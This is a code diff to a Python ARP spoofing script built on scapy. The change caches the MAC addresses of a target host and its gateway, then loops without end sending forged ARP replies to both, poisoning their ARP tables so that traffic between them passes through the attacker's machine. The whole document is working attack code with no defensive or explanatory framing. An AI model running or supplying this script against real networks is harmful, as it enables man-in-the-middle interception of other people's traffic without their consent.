@@ -44,13 +44,12 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc
 
 
-def spoof(target_ip,spoof_ip):
+def spoof(target_ip,spoof_ip,target_mac):
     r""" This function poisons the ARP table of the target IP and spoofs the spoof IP with our MAC address.
     :param target_ip: Target IP
     :param spoof_ip: Spoofing IP
     :return: NONE
     """
-    target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
@@ -61,9 +60,11 @@ def print_sent_packets(target,gateway):
     :return: NONE
     """
     sent_packets_count = 0
+    target1_mac = get_mac(target)
+    target2_mac = get_mac(gateway)
     while True:
-        spoof(target, gateway)
-        spoof(gateway, target)
+        spoof(target, gateway,target1_mac)
+        spoof(gateway, target,target2_mac)
         sent_packets_count = sent_packets_count + 2
         print("\r[+] Packets sent : " + str(sent_packets_count) + " "),
         sys.stdout.flush()
